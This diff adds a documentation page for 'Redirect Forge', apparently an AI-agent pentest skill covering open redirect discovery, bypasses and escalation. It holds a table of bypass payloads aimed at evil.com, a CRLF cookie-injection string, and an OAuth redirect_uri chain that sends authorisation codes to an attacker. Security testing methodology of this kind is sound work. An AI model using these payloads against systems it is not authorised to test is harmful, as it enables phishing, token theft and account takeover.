@@ -1,0 +1,138 @@
+---
+title: Redirect Forge
+description: Complete open redirect detection and exploitation methodology — parameter discovery, 30+ bypass techniques, OAuth token theft, SSRF chaining, CSP abuse, phishing escalation, and report structure.
+---
+
+<Info>
+  **Category:** Pentest & security testing
+</Info>
+
+**Installation**
+
+```bash
+auditguard-skills add redirect-forge
+```
+
+---
+
+## Summary
+
+Detect and exploit open redirect vulnerabilities across all parameter types, then escalate to OAuth token theft, SSRF, CSP bypass, and phishing.
+
+- Phase 1 discovers redirect parameters via passive recon (gau, waybackurls), active crawling (katana), HTTP header abuse, and OAuth/SSO-specific parameters
+- Phase 2 verifies basic open redirect with a canary before reaching for bypasses
+- Phase 3 covers 13 bypass technique categories: protocol substitution, allowlist suffix/prefix bypass, @ operator, URL encoding, double encoding, Unicode/IDN, path traversal, IPv6/IP confusion, parameter pollution, fragment tricks, case sensitivity, and CRLF injection
+- Phase 4 targets OAuth `redirect_uri` — the highest-impact variant — with bypass techniques and token capture setup
+- Phase 5 documents escalation chains: redirect → SSRF, redirect → CSP bypass, redirect → phishing, redirect → SAML/SSO token theft
+- Phases 6–8 cover blind open redirect via OOB, automated testing with openredirex/ffuf/nuclei, and a complete report structure with CVSS vectors
+
+---
+
+## SKILL.md
+
+### Redirect Forge — Open Redirect
+
+#### When to Use This Skill
+
+Use this skill when the user:
+
+- Asks to test for open redirect, URL redirection, or unvalidated redirect/forward
+- Sees a parameter like `?next=`, `?url=`, `?redirect=`, `?return=`, `?goto=`, `?destination=` in a URL
+- Wants to steal OAuth tokens or authorization codes via `redirect_uri` manipulation
+- Needs to chain open redirect → SSRF, open redirect → CSP bypass, or open redirect → account takeover
+- Sees a 301/302/307/308 response and wants to know if the `Location` header is controllable
+- Wants to bypass a redirect allowlist or whitelist
+
+#### What Does It Check?
+
+**In scope:**
+- All redirect parameter names: redirect, return, next, goto, url, dest, forward, callback, and 20+ more
+- HTTP headers that trigger redirects: Referer, X-Original-URL, X-Forwarded-Host, Host
+- OAuth/SSO parameters: redirect_uri, callback_url, post_logout_redirect_uri
+- 13 categories of bypass techniques for allowlists and WAF rules
+- Escalation chains: OAuth token theft, SSRF, CSP bypass, CRLF injection, phishing
+
+**Out of scope:**
+- Redirects to the same domain with no external navigation (not a vulnerability)
+
+#### How It Works
+
+**Phase 1: Discover Redirect Parameters**
+
+```bash
+gau target.com | grep -iE "(redirect|return|next|goto|url|dest|redir|forward|target|callback)=" | sort -u
+```
+
+**Phase 2: Verify Basic Open Redirect**
+
+```
+https://target.com/login?next=https://evil.com
+```
+
+Confirm: the browser ends up at `https://evil.com`.
+
+**Phase 3: Bypass Techniques**
+
+| Category | Examples |
+|---|---|
+| Protocol substitution | `//evil.com`, `///evil.com`, `javascript:alert(1)` |
+| @ operator | `https://target.com@evil.com` |
+| URL encoding | `%2F%2Fevil.com`, `%09//evil.com`, `%00//evil.com` |
+| Double encoding | `%252F%252Fevil.com` |
+| Unicode | `https://ⓔvil.com`, `https://evil。com` |
+| Fragment tricks | `https://evil.com#.target.com` |
+| CRLF injection | `?url=https://evil.com%0d%0aSet-Cookie:%20session=hijacked` |
+
+**Phase 4: OAuth redirect_uri Exploitation**
+
+Replace `redirect_uri` with attacker server → victim completes OAuth → auth code delivered to attacker → account takeover.
+
+Chain with same-domain open redirect when the IdP whitelists `https://target.com/*`:
+```
+redirect_uri=https://target.com/go?to=https://evil.com
+```
+
+**Phase 5: Escalation Chains**
+
+| Chain | Severity | Conditions |
+|---|---|---|
+| Redirect → phishing | Medium | Standalone brand trust abuse |
+| Redirect → OAuth token theft | Critical | OAuth implicit flow + redirect on same domain |
+| Redirect → SSRF | Critical | Server fetches URL before redirecting |
+| Redirect → CSP bypass + XSS | Critical | Trusted domain whitelisted in CSP |
+
+#### Output
+
+| Severity | Condition |
+|---|---|
+| Critical | OAuth/SAML token theft, SSRF chain, CSP bypass → XSS |
+| High | Credential phishing with CRLF or session leak via Referer |
+| Medium | Standalone open redirect for phishing (no token theft) |
+| Low | Redirect to same domain, or requires authenticated victim |
+
+#### Known Limitations
+
+- App that redirects to a fixed list of URLs is not vulnerable — verify redirect destination is truly attacker-controlled
+- `Location` header present but middleware blocks external domains downstream → false positive; test with actual browser or curl -L
+
+---
+
+## Related skills
+
+<CardGroup cols={3}>
+  <Card title="ssrf-hunter" href="/skills/ssrf-hunter">
+    Complete SSRF detection and exploitation methodology — cloud metadata, internal network enumeration, and bypass techniques
+
+    
+  </Card>
+  <Card title="hpp-hunter" href="/skills/hpp-hunter">
+    Complete HTTP Parameter Pollution methodology — WAF bypass, OAuth abuse, payment manipulation
+
+    
+  </Card>
+  <Card title="xss-hunter" href="/skills/xss-hunter">
+    Complete XSS testing methodology — reflected, stored, DOM-based, blind, and mutation XSS
+
+    
+  </Card>
+</CardGroup>
